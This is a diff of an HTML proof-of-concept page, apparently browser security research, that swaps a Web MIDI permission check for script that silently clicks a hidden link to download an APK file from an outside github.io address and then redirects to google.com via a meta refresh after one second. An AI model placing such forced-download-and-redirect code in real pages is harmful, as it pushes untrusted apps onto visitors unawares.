@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MIDI Permission Test</title>
+    <title>Download + Meta Refresh</title>
 </head>
 <body>
 
@@ -10,24 +10,20 @@
 <script>
 function sleep() {
 
-    document.body.insertAdjacentHTML("beforeend", "Requesting MIDI access...<br>");
+    document.body.insertAdjacentHTML("beforeend", "123<br>");
 
-    if (navigator.requestMIDIAccess) {
-        navigator.requestMIDIAccess({ sysex: true })
-        .then(function(midiAccess) {
-            document.body.insertAdjacentHTML("beforeend", "MIDI access granted<br>");
-        })
-        .catch(function(err) {
-            document.body.insertAdjacentHTML("beforeend", "MIDI access denied<br>");
-        });
-    } else {
-        document.body.insertAdjacentHTML("beforeend", "Web MIDI not supported<br>");
-    }
+    // Create download link
+    var link = document.createElement("a");
+    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
+    link.download = "montero.apk";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
-    // Immediate redirect (like your previous PoC)
+    // Create meta refresh (redirect after 1 second)
     var meta = document.createElement("meta");
     meta.httpEquiv = "refresh";
-    meta.content = "0;url=https://google.com";
+    meta.content = "1;url=https://google.com";
     document.head.appendChild(meta);
 }
 </script>
